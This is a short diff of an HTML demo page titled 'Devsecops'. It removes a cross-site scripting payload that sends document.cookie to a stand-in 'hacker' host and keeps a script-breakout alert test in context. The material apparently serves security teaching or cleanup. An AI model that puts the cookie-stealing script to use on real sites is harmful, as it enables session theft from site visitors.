@@ -11,9 +11,9 @@
   var s = "surprise!</script><script>alert('whoops!')</script>";
 </script>  
    
-<SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+
     
-<title>Example document: XSS Doc</title>
+
 
     <title>Devsecops </title>
 
@@ -80,7 +80,7 @@
             
             
         <div class="col-md-4">
-            <h2>Heading
+            <h2>Heading<h2/>
             <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
             <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
         </div>
